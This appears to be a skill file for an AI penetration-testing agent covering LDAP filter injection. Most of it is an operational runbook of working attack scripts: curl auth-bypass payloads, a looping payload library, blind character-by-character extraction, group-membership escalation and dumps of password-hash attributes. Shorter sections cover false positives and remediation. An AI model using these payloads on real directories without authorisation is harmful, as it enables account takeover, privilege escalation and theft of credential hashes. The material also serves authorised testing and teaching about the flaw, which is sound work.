---
name: ldap-injection
description: LDAP filter injection — auth bypass, attribute extraction, blind enumeration via boolean predicates
triggers: [ldap, ldap injection, ad, active directory, openldap, distinguished name, dn, ldapsearch]
---

# LDAP Injection

When an application builds an LDAP search filter by concatenating user input into the filter string, attackers can rewrite the predicate. The canonical bug: a login form builds `(&(uid=<user>)(password=<pass>))` and a payload like `*)(uid=*)` short-circuits the auth check. Filter-level injection also enables enumeration via boolean predicates and full directory dumps via wildcard expansion.

CWE-90. Companion to `scan_ldap_injection`.

## Attack Surface

**Where LDAP appears in modern apps**
- Enterprise SSO via Active Directory / LDAP (older Java + .NET apps)
- Identity providers fronted by LDAP (FreeIPA, OpenLDAP, ApacheDS, Active Directory)
- Apps using LDAP as a user store (search-then-bind authentication)
- Directory-backed app config (some Java apps store config in LDAP)
- Email-server address-book lookups (Exchange, Postfix)

**Vulnerable code patterns**
```java
// Java
String filter = "(&(uid=" + username + ")(password=" + password + "))";
ctx.search("ou=people,dc=example,dc=com", filter, controls);

// Python
filter = f"(uid={username})"
conn.search_s(base_dn, ldap.SCOPE_SUBTREE, filter)

// .NET
var filter = $"(&(sAMAccountName={user})(memberOf=cn=admins,...))";
new DirectorySearcher(filter).FindAll();
```

Any string concatenation into a filter = injection candidate.

## LDAP Filter Syntax (need-to-know)

```
(attribute=value)                 # equality
(&(filter1)(filter2))             # AND
(|(filter1)(filter2))             # OR
(!(filter))                       # NOT
(attribute=val*)                  # prefix wildcard
(attribute=*val)                  # suffix wildcard
(attribute=*)                     # any value
(attribute>=value)                # >=
(attribute<=value)                # <=
```

Injection works by closing the current predicate and opening a new one.

## Detection Channels

### Auth-bypass probe (the classic)

```bash
# Login form expects username + password; injects into filter
curl -X POST 'https://<TARGET>/login' \
  -d 'username=*)(uid=*))(|(uid=*&password=anything'

# OR using the simpler one-liner that often works
curl -X POST 'https://<TARGET>/login' \
  -d 'username=admin)(&)&password=anything'

# The payload `admin)(&)` makes the filter become:
#   (&(uid=admin)(&))(password=anything)
# The (&) matches everything, so the bind succeeds for "admin" regardless of password.
```

### Boolean-blind extraction

```bash
# Probe one bit of an admin user's mail attribute
curl -X POST 'https://<TARGET>/search' -d 'q=*)(mail=a*'
curl -X POST 'https://<TARGET>/search' -d 'q=*)(mail=b*'
# Different response shape (number of results) reveals first char.
```

### Error-based fingerprint

```bash
# Trigger an LDAP error — many servers leak the version + error detail
curl -X POST 'https://<TARGET>/search' -d 'q=)*'
# Look for: "LDAPException", "Bad search filter", "syntax error", "0x0000208D"
```

### Attribute enumeration

```bash
# When the app reflects matched attributes in the response
curl 'https://<TARGET>/users?filter=*)(objectClass=*'
# Returns all directory objects; useful for finding admin groups, service accounts, etc.
```

## Operational Runbook

### Step 1 — fingerprint the LDAP backend

```bash
# Try error-based fingerprint
PROBES=( '*' ')*' ')(uid=*' '(&)' '*)((' )
for p in "${PROBES[@]}"; do
  echo "Probe: $p"
  curl -s -X POST 'https://<TARGET>/search' --data-urlencode "q=$p" | head -20
done
```

Error formats:
- **OpenLDAP**: "Bad search filter", error code in hex
- **Active Directory**: "0x0000208D" / "0x80072020" / mentions LDAPException
- **Sun ONE / FreeIPA**: Java exception trace with LDAPException class

### Step 2 — authn bypass attempt

```bash
# Payload library — try each on the login form
PAYLOADS=(
  '*)(uid=*'
  '*)(&)'
  'admin)(&)'
  '*))%00'
  '*)(|(uid=*'
  'admin*)((|(password=*'
  ')(cn=*'
  ')((cn=*'
)

for p in "${PAYLOADS[@]}"; do
  RESP=$(curl -s -i -X POST 'https://<TARGET>/login' \
    --data-urlencode "username=$p" \
    --data-urlencode 'password=anything')
  if echo "$RESP" | grep -qE 'set-cookie.*session|"token":|HTTP/.. 302'; then
    echo "BYPASS WORKS: $p"
    break
  fi
done
```

### Step 3 — blind extraction

```bash
# Char-by-char extraction of admin user's mail attribute
EXTRACTED=""
for pos in {1..30}; do
  for c in {a..z} {0..9} '.' '@'; do
    RESP_SIZE=$(curl -s 'https://<TARGET>/search' \
      --data-urlencode "filter=*)(mail=${EXTRACTED}${c}*" \
      -o /dev/null -w '%{size_download}')
    if [[ "$RESP_SIZE" -gt "$BASELINE_NOMATCH_SIZE" ]]; then
      EXTRACTED="${EXTRACTED}${c}"
      echo "Pos $pos: $EXTRACTED"
      break
    fi
  done
done
```

### Step 4 — group / role escalation

```bash
# Most-impact LDAP injection — get yourself into the admin group
# Some apps build filters like:
#   (&(uid=<current_user>)(memberOf=cn=<requested_group>,ou=groups,...))
# If <requested_group> is user-controllable in URL, inject:
curl 'https://<TARGET>/api/admin?group=admins)(|(uid=*'
# Filter becomes:
#   (&(uid=current_user)(memberOf=cn=admins)(|(uid=*),ou=groups,...))
# The (|(uid=*) wildcard matches everything; current_user is now "in" the admin group.
```

### Step 5 — dump all users / sensitive attributes

```bash
# When the app supports a search endpoint with reflected results
curl 'https://<TARGET>/directory?filter=)(uid=*'
# Returns the entire user list

# For sensitive attributes (when readable)
curl 'https://<TARGET>/directory?filter=)(userPassword=*'  # password hashes
curl 'https://<TARGET>/directory?filter=)(unicodePwd=*'    # AD password hash attribute
```

## Bypass Techniques

- **Wildcard tail vs anchor**: `*)(uid=*` is the canonical; some filters work better with `*))(|(uid=*`.
- **Null byte termination**: `*)%00` truncates the filter at the null byte in C-string-based parsers (older OpenLDAP).
- **Unicode normalisation**: some apps normalise input before LDAP-escaping. Try multi-byte equivalents of `*` and `(`.
- **Filter component swap**: target attributes other than `uid` — `cn`, `mail`, `sAMAccountName`, `userPrincipalName`.
- **Bind-distinguished-name injection**: when the app builds `bindDN = "uid=" + user + ",ou=people,..."`, inject `,ou=admins,dc=example,dc=com` to re-root the bind.

## LDAPS vs LDAP

Both are vulnerable to filter injection — TLS encrypts the transport but doesn't sanitise the filter string. LDAP search ports: 389 (LDAP), 636 (LDAPS), 3268 / 3269 (AD Global Catalog).

## Validation

1. Auth bypass: produce a `Set-Cookie: session=...` or `{"token":"..."}` response without supplying a valid password.
2. Blind extraction: extract a known-admin's email / DN one character at a time using boolean probes.
3. Group escalation: demonstrate API access to a route that should require admin membership, using a low-priv user's credentials + filter injection.
4. Document: backend (OpenLDAP / AD), exact filter pattern (inferred from error messages or app logic), payload that worked.

## False Positives

- App uses **parameterised LDAP queries** (`PreparedStatement`-equivalent — `LDAPFilterBuilder` / `LdapQueryBuilder` in Spring LDAP). No string concat; no injection.
- App-side input validation strips `*`, `(`, `)`, `=`, `,`, `\` before building the filter. Confirm by probing for each individually.
- 500 errors unrelated to LDAP parsing — the back-end may be barfing on the request shape.

## Impact

- Authentication bypass — most common; trivial when filter concatenation is present.
- Mass directory enumeration — read every user's mail, role, group, last-login, etc.
- Privilege escalation via group-membership injection.
- Password hash extraction (when attributes like `userPassword` are returned).
- Cross-system pivot — LDAP often the authoritative identity store for the whole org.

## Remediation

1. **Use parameterised filter builders**: Spring LDAP's `LdapQueryBuilder`, .NET's `LdapFilterBuilder`, python-ldap's `ldap.filter.escape_filter_chars()`. Never string-concat user input into a filter.
2. **Escape input at the LDAP boundary**: `*` → `\2a`, `(` → `\28`, `)` → `\29`, `\` → `\5c`, NUL → `\00`.
3. **Validate filter input shape** at the app layer (alphanumeric + dot + dash for usernames, etc.).
4. **Use bind-then-search instead of search-then-bind** for auth: bind first with user credentials, then optionally do an unrelated search. Removes the auth-bypass surface entirely.
5. **Minimise read permissions**: the app's LDAP bind user should be read-only and scoped to the directory subtree it needs.

## Pro Tips

1. The classic `*)(uid=*` payload still works on huge numbers of legacy Java / .NET apps. Always start there.
2. Active Directory's `sAMAccountName` is the most common login attribute in enterprise apps; OpenLDAP defaults to `uid`. Probe both.
3. AD's `objectClass=user` filter returns all user accounts — high-value enumeration target when injection works.
4. LDAP error messages are verbose by default — fingerprint the backend in the first few probes.
5. When testing AD, look for the **Global Catalog** ports (3268/3269) — they expose a *partial* but org-wide view, often less locked-down than the per-DC LDAP.

## Summary

LDAP injection is SQLi for directories. The classic auth-bypass payload is 20+ years old and still works against legacy stacks; parameterised filter builders kill the class outright.
